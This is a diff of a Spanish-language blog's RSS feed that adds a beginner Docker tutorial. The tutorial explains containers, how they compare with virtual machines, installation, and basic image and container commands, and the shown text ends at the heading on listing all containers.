@@ -5,9 +5,1047 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 19 Jul 2023 20:40:37 +0000</pubDate>
-    <lastBuildDate>Wed, 19 Jul 2023 20:40:37 +0000</lastBuildDate>
+    <pubDate>Sat, 22 Jul 2023 06:37:36 +0000</pubDate>
+    <lastBuildDate>Sat, 22 Jul 2023 06:37:36 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Aprende Docker y domina el uso de los contenedores</title>
+        <description>&lt;p&gt;Hola en esta ocasión aprenderemos a usar &lt;code&gt;Docker&lt;/code&gt; donde voy a explicarte a detalle paso a paso su funcionamiento y los beneficios que nos otorga usar esta tecnologia la cual puede ayudarnos mucho, asi que es tu momento para aprenderla 😃.&lt;/p&gt;
+
+&lt;h2 id=&quot;indice-y-estructura&quot;&gt;Indice y Estructura&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#que-es-docker&quot;&gt;Que es Docker?&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#que-es-un-contenedor&quot;&gt;Ques es un contenedor?&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#por-que-aprender-docker&quot;&gt;Por que aprender Docker?&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#almacenamiento-de-contenedores&quot;&gt;Almancenamineto de Contenedores&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#antecedentes&quot;&gt;Antecedentes&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#despliegue-de-contenedores&quot;&gt;Despligue de Contenedores&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#diferencias&quot;&gt;Diferencias entre Contenedor y Maquina Virtual&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#instalacion&quot;&gt;Instalación&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#docker-hub&quot;&gt;Docker Hub&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#listar-imagenes&quot;&gt;Listar Imagenes&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#descargar-imagenes&quot;&gt;Descargar Imagenes &lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#eliminar-una-imagen&quot;&gt;Eliminar una Imagen&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#crear-un-contenedor&quot;&gt;Creación de un Contenedor&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#iniciar-un-contenedor&quot;&gt;Iniciar un contenedor&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#listar-un-contenedor&quot;&gt;Listar Contenedores en Ejecución&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#detener-un-contenedor&quot;&gt;Detener un Contenedor&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#listar-todos-los-contenedores&quot;&gt;Listar Todos los Contenedores&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#eliminar-un-contenedor&quot;&gt;Eliminar un Contenedor&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#establecer-nombre-a-un-contenedor&quot;&gt;Establecer nombre a un Contenedor&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#ejecutar-comandos&quot;&gt;Ejecutar Comandos dentro del Contenedor&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#port-mapping&quot;&gt;Port Mapping&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#mostrar-logs&quot;&gt;Mostrar logs de un Contenedor&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#docker-run&quot;&gt;Docker Run&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#conexion-con-un-contenedor&quot;&gt;Conexión con un Contenedor&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#insertar-aplicacion-en-un-contenedor&quot;&gt;Insertar Aplicación en un Contenedor&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#crear-una-imagen&quot;&gt;Crear una Imagen&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#dockerfile&quot;&gt;Dockerfile&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#creacion-de-una-red&quot;&gt;Creación de una Red&lt;/a&gt;
+        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#docker-network&quot;&gt;Docker Network&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#docker-build&quot;&gt;Docker Build&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#docker-compose&quot;&gt;Docker Compose&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#volumenes&quot;&gt;Volumenes&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;que-es-docker&quot;&gt;Que es Docker? &lt;a href=&quot;#que-es-docker&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Docker es una plataforma de contenedores que nos permite empaquetar, distribuir y ejecutar aplicaciones de manera eficiente consistente en diferentes entornos, ya que proporciona una forma de encapsular una aplicación y todas sus dependencias en un contenedor virtual ligero y autonomo.&lt;/p&gt;
+
+&lt;p&gt;Pero para entenderlo mejor debemos saber en ciencia exacta que es un contenedor?..&lt;/p&gt;
+
+&lt;h2 id=&quot;que-es-un-contenedor&quot;&gt;Que es un Contenedor? &lt;a href=&quot;#que-es-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Un contenedor es una unidad de software autónoma que encapsula una aplicación y todas sus dependencias, incluyendo el código, las bibliotecas y las variables de entorno necesarias para que la aplicación se ejecute de manera consistente en diferentes entornos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;por-que-aprender-docker&quot;&gt;Por que aprender Docker? &lt;a href=&quot;#por-que-aprender-docker&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Entendiendo mejor el concepto de que es un contenedor y como funciona docker, entocnes por que deberia aprenderlo?, pues hay muchas razones y algunas de estas serian:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Desarrollo y despliegue más rápido:&lt;/strong&gt; Docker facilita la creación y gestión de entornos de desarrollo consistentes. Puedes empaquetar tu aplicación y todas sus dependencias en un contenedor, lo que permite que todo el equipo de desarrollo tenga exactamente el mismo entorno de trabajo. Además, el despliegue de la aplicación se vuelve más rápido y confiable, ya que no tienes que preocuparte por las diferencias entre los entornos de desarrollo y producción.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Portabilidad y compatibilidad:&lt;/strong&gt; Docker es una tecnología altamente portable. Puedes desarrollar una aplicación en tu máquina local y ejecutarla en cualquier otro entorno que tenga Docker instalado, ya sea en un servidor local, en la nube o en el centro de datos. Esto hace que sea más fácil compartir y distribuir tu aplicación, sin preocuparte por las dependencias o las diferencias en los sistemas operativos.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Aislamiento y seguridad:&lt;/strong&gt; Docker proporciona un entorno aislado para tus aplicaciones. Cada contenedor tiene su propio sistema de archivos y recursos aislados, lo que evita conflictos y problemas de compatibilidad entre aplicaciones. Además, puedes configurar permisos y restricciones para controlar el acceso y proteger tus aplicaciones y datos.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Escalabilidad y eficiencia en el uso de recursos:&lt;/strong&gt; Docker permite escalar tus aplicaciones de manera eficiente. Puedes replicar contenedores y distribuir la carga entre ellos para manejar aumentos en la demanda de manera más rápida y sencilla. Además, los contenedores son livianos y comparten recursos del sistema, lo que maximiza la utilización de los recursos y reduce los costos operativos.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Ecosistema y comunidad activa:&lt;/strong&gt; Docker cuenta con una amplia comunidad de usuarios y desarrolladores. Esto significa que hay una gran cantidad de recursos, documentación, tutoriales y ejemplos disponibles en línea. Además, Docker se integra con muchas otras herramientas y servicios populares, lo que amplía aún más las posibilidades de uso y colaboración.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;almacenamiento-de-contenedores&quot;&gt;Almacenamiento de Contenedores &lt;a href=&quot;#almacenamiento-de-contenedores&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Los contenedores se almanecenan en repositorios publicos y privados. De los cuales el repositorio publico mas conocido es &lt;code&gt;Docker Hub&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Aqui podemos ejecutar todo tipo de aplicaciones como &lt;code&gt;Python&lt;/code&gt;, &lt;code&gt;SQL&lt;/code&gt;, &lt;code&gt;Python&lt;/code&gt;, &lt;code&gt;Disstribuciones Linux&lt;/code&gt;, &lt;code&gt;MongoDB&lt;/code&gt; y mucho mas.&lt;/p&gt;
+
+&lt;h2 id=&quot;antecedentes&quot;&gt;Antecedentes &lt;a href=&quot;#antecedentes&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Antes de usarse los contenedores existian varios problemas a la hora de que un equipo de desarrollo trabajara en conjunto, esto debido a que cada uno de los mienbros podia tener distinto sistemas operativos y de la misma manera al trabajar en una aplicación estos tendrian distintas versiones de la misma instaladas. Esto causaria una serie de problemas con las dependencias necesarias para la ejecución correcta del programa.&lt;/p&gt;
+
+&lt;p&gt;Como consecuencia eventualmente el desarrollo de la aplicación termine mal.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Afortunadamente con los contenedores ahora este tedioso proceso podemos llegar a automatizarlo.&lt;/p&gt;
+
+&lt;p&gt;Para ello debemos descargar una &lt;code&gt;imagen&lt;/code&gt; basada en linux, pero que es una imagen?&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Imagen: En Docker, una imagen es un paquete ejecutable y autocontenido que incluye todo lo necesario para ejecutar una aplicación, incluyendo el código, las bibliotecas, las dependencias y las configuraciones necesarias. Se puede pensar en una imagen como una plantilla o un plano a partir del cual se crean los contenedores.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Gracias a esto con solo ejecutar un comando, podemos tener la aplicación corriendo en nuestra maquina, e incluso ademas podriamos tener distintas versiones de esta misma aplicación corriendo en nuestro sistema sin tener ningun conflicto.&lt;/p&gt;
+
+&lt;h3 id=&quot;despliegue-de-contenedores&quot;&gt;Despliegue de Contenedores &lt;a href=&quot;#despliegue-de-contenedores&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Cuando queremos desplegar o actualizar nuestra aplicación, necesitaremos el codigo , dependencias y archivos de configuración. Esto puede ser propenso al no haberse considerado alguna dependencia y generando problemas de comunica´ción. Estos errores unicamente podremos verlos al momento de desplegar nuestra aplicación, lo cual generaria problemas y necesitariamos volver a una versión anterior para que nuestro sistema sigua en funcionamiento.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pero gracias a &lt;code&gt;Docker&lt;/code&gt; todo esto podemos evitarlo ya que solo debemos construir una &lt;code&gt;imagen&lt;/code&gt; cuya unica dependencia sera el &lt;code&gt;Runtime&lt;/code&gt; de docker.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Runtime: El &lt;code&gt;runtime&lt;/code&gt; de Docker se refiere al componente responsable de ejecutar los contenedores Docker en un sistema operativo. En otras palabras, es el entorno en el que se ejecutan y se gestionan los contenedores.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Y este proceso puede ser automatizado a traves de pipelines como &lt;code&gt;github&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por lo que un contenedor en simples palabras vendria a ser capas sobre capas de imagenes donde la primera por lo general sera una distribución basada en linux y por lo general esta corresponde a &lt;code&gt;Alpine&lt;/code&gt; ya que es una imagen bastante liviana.&lt;/p&gt;
+
+&lt;p&gt;Des esta manera tendremos sobre esta una serie de imagenes hasta que podamos llegar a nuestra capa de aplicación.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;diferencias&quot;&gt;Diferencias entre Contenedor y Maquina Virtual &lt;a href=&quot;#diferencias&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Al ser docker una forma de virtualización es importante tener en claro las diferencias entre docker y una maquina virtual.&lt;/p&gt;
+
+&lt;p&gt;Debemos tener claro que la &lt;code&gt;virutalización&lt;/code&gt; se basa en 3 capas, las cuales corresponden al hardware, kernel y la aplicación.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Hardware:&lt;/strong&gt; Donde se va ejecutar la virtualización.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Kernel:&lt;/strong&gt; Se encarga de la comunicación con el hardware, siendo responsable de gestionar los recursos del sistema y proporcionar servicios a los programas en ejecución.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Aplicaciones:&lt;/strong&gt; Aplicación de la cual vamos a hacer uso.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;De estas capas las &lt;code&gt;VM&lt;/code&gt; virtualizan tanto las &lt;code&gt;aplicaciones&lt;/code&gt; y el &lt;code&gt;kernel&lt;/code&gt;, en consecuencia las imagenes tienen un peso muy alto.&lt;/p&gt;
+
+&lt;p&gt;Pero en el caso de &lt;code&gt;Docker&lt;/code&gt;, unicamente virtualiza las aplicaciones, ya que en el caso del &lt;code&gt;Kernel&lt;/code&gt; lo que hace docker es utilizar el propio kernel del sistema operativo anfitrión.&lt;/p&gt;
+
+&lt;p&gt;En consencuencia las imagenes pesan mucho menos, su rendimiento es superior ya que se ejecutan casi instantaneamente. Por lo que desarrollar y desplegar aplicaciones sera mucho mas rapido y optimo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;instalacion&quot;&gt;Instalación &lt;a href=&quot;#instalacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Para poder instalar &lt;code&gt;Docker&lt;/code&gt; si nos encontramos en &lt;code&gt;Windows&lt;/code&gt; debemos instalar &lt;code&gt;Docker Desktop&lt;/code&gt; que viene a ser una VM linux y nos permitira ejecutar contenedores.&lt;/p&gt;
+
+&lt;p&gt;Si deseas descargarla puedes hacerlo desde el enlace oficial:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.docker.com/products/docker-desktop/&quot;&gt;https://www.docker.com/products/docker-desktop/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si te encuentras en &lt;code&gt;linux&lt;/code&gt; simplemente puedes instalarlo ejecutando:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt update
+sudo apt install docker-ce docker-ce-cli containerd.io
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;docker-hub&quot;&gt;Docker Hub &lt;a href=&quot;#docker-hub&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Una vez tengamos ya instalado &lt;code&gt;Docker&lt;/code&gt;, vamos a dirigirnos a el repositorio &lt;code&gt;Docker Hub&lt;/code&gt;, donde podemos ver todas las herramientas que podemos utilizar.&lt;/p&gt;
+
+&lt;p&gt;Podemos ver que podemos usar imagenes de &lt;code&gt;Python&lt;/code&gt;, &lt;code&gt;Sql&lt;/code&gt;, &lt;code&gt;Ubuntu&lt;/code&gt;, &lt;code&gt;Node&lt;/code&gt; entre muchas mas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si ahora pinchamos en alguna de ellas como &lt;code&gt;Python&lt;/code&gt; y deslizamos un poco podemos ver distintas versiones de &lt;code&gt;Python&lt;/code&gt; que podemos utilizar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y ahora si subimos un poco, veremos un comando donde veremos un comando el cual si lo ejecutamos nos descargara la imagen respectiva en este caso la de &lt;code&gt;Python&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;listar-imagenes&quot;&gt;Listar Imagenes &lt;a href=&quot;#listar-imagenes&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;El primer comando que ejecutaremos sera &lt;code&gt;docker images&lt;/code&gt; y este nos monstrara todas las imagenes que hemos descargado en nuestro sistema.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como podemos ver no nos lista nada debido a que todavia no contamos con ninguna imagen descargada.&lt;/p&gt;
+
+&lt;h2 id=&quot;descargar-imagenes&quot;&gt;Descargar Imagenes &lt;a href=&quot;#descargar-imagenes&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Par poder descargar una imagen solo debemos de usar el comando &lt;code&gt;docker pull&lt;/code&gt;, ahora bien existen dos formas a traves de las cuales podemos hacerlo.&lt;/p&gt;
+
+&lt;p&gt;La primera es simplemente ejecutar el comando y seguido el nombre de la aplicación que queremos descargar, esto por defecto nos descargara la ultima versión disponible.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos como &lt;code&gt;docker&lt;/code&gt; descarga cada una de las capas que componen nuestra imagen y si en algun caso nosotros vamos a descargar otra imagen cuyas capas ya fueron descargadas antes por otra imagen como la que tenemos &lt;code&gt;mysql&lt;/code&gt;, estas capas no volveran a descargarse ya que usaran las que ya tenemos optimizando nuestro espacio en disco.&lt;/p&gt;
+
+&lt;p&gt;Si ahora volvemos a listar las imagenes &lt;code&gt;docker images&lt;/code&gt;, observamos que esta vez ya contamos con una imagen descargada.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si miramos con atención observamos que nuestra imagen tiene una serie de etiquetas.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;REPOSITORY:&lt;/strong&gt; Indica el nombre de la imagen&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;TAG:&lt;/strong&gt; Indica la versión utilizada, en este caso usa &lt;code&gt;latest&lt;/code&gt; al no haberla especificado.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;IMAGE ID:&lt;/strong&gt; Corresponde a un identificador unico de la imagen.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CREATED:&lt;/strong&gt; Cuando fue creada la imagen.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;SIZE:&lt;/strong&gt; Espacio usado en disco.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;La segunda manera en la que podemos descargar una imagen seria especificar la versión exacta que queremos descargar, para ello debemos agregar con &lt;code&gt;:version&lt;/code&gt; la versión de la imagen y ejecutar el mismo comando.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Observamos que esta vez la imagen se nos descargo casi al instante. Si ahora volvemos a listar las imagenes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Despues de volver a lista vemos que tenemos casi las mismas etiquetas, ya que al especificar la versión en la descarga, usamos la ultima y seria el mismo proceso al no especificar la versión ya que de esa manera tambien nos descarga la ultima versión. Solo que esta vez tenemos dos imagenes pero con distintos valores en el &lt;code&gt;TAG&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a descargar otra versión mas antigua de &lt;code&gt;mysql&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listamos nuevamente las imagenes y esta vez ya que descargamos una versión previa observamos la nueva versión en conjunto con un nuevo identificador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;De esta manera podemos descargarnos distintas imagenes con sus respectivas versiones y si queremos ver cuales estan disponibles, solo debemos dirigirnos a &lt;code&gt;Docker Hub&lt;/code&gt; y elegir la versión que necesitemos.&lt;/p&gt;
+
+&lt;h2 id=&quot;eliminar-una-imagen&quot;&gt;Eliminar una Imagen &lt;a href=&quot;#eliminar-una-imagen&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Para poder eliminar una imagen previamente descargada, tenemos que ejecutar el comando &lt;code&gt;docker image rm nombre_imagen:version&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Entonces listamos nuevamente las imagenes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y ahora procederemos a eliminar las versiones &lt;code&gt;8.0&lt;/code&gt; y &lt;code&gt;5.7&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listamos nuevamente las imagenes disponibles y vemos que se eliminaron con exito las versiones seleccionadas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;crear-un-contenedor&quot;&gt;Creación de un Contenedor &lt;a href=&quot;#crear-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Para poder crear un contenedor, primero debemos tener descargada una imagen y ya que previamente estuvimos usando una correspondiente a &lt;code&gt;mysql&lt;/code&gt;, pero para realizar una variacion y simplicidad vamos a trabajar con &lt;code&gt;mongodb&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Asi que primero vamos a proceder a descargar la imagen de &lt;code&gt;mongo&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker23.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y volvemos a verificar que la imagen fue correctamente descargada.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker24.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora para poder crear nuestro contenedor debemos ejecutar &lt;code&gt;docker create nombre_imagen&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker20.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto nos devuelve un identidicador del contenedor que creamos.&lt;/p&gt;
+
+&lt;p&gt;Ahora tambien podriamos usar el comando &lt;code&gt;docker container create nombre_imagen&lt;/code&gt; para crear un contenedor, pero la forma anterior es mejor ya que lo simplifica.&lt;/p&gt;
+
+&lt;h3 id=&quot;iniciar-un-contenedor&quot;&gt;Iniciar un Contenedor &lt;a href=&quot;#iniciar-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Una vez ya creado nuestro contenedor, debemos iniciarlo para poder levantar el servicio que tengamos corriendo.&lt;/p&gt;
+
+&lt;p&gt;Para ello usamos el comando &lt;code&gt;docker start id_contenedor&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker21.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y de la misma manera nos devuelve el propio identificador como respuesta al ejectar el comando indicandonos que se inicio correctamente.&lt;/p&gt;
+
+&lt;h3 id=&quot;listar-un-contenedor&quot;&gt;Listar Contenedores en Ejecución &lt;a href=&quot;#listar-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Para poder verificar que el contenedor se inicio de manera correcta tendremos que ejecutar el comando &lt;code&gt;docker ps&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker22.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Este comando nos muestra un consunto de etiquetas que corresponden:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;CONTAINER ID:&lt;/strong&gt; Es el id del contenedor pero simplificado.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;IMAGE:&lt;/strong&gt; Indica en que imagen se baso el contenedor para su creación.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;COMMAND:&lt;/strong&gt; Es el comando que usa el contenedor para ejecutarse.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CREATED:&lt;/strong&gt; Cuando fue creado el contenedor.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;STATUS:&lt;/strong&gt; Indica el estado en el que se encuentra el contenedor.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;PORTS:&lt;/strong&gt; Especifica el puerto del que se hace uso para ejecutar el contenedor.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;NAMES:&lt;/strong&gt; El nombre del contenedor.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;detener-un-contenedor&quot;&gt;Detener un Contenedor &lt;a href=&quot;#detener-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
+&lt;p&gt;Que paso ahora si queremos detener la ejecución del contenedor, usamos el comando &lt;code&gt;docker stop id_contenedor&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker25.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si tratamos ahora a mostrar los contenedores en ejecución, vemos que esta vez no nos devuelve nada debido a que detuvimos el que previamente creamos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker26.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sin embargo esto no quiere decir que el contenedor se haya borrado ya que este sigue existiendo.&lt;/p&gt;
+
+&lt;h3 id=&quot;listar-todos-los-contenedores&quot;&gt;Listar todos los Contenedores &lt;a href=&quot;#listar-todos-los-contenedores&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+
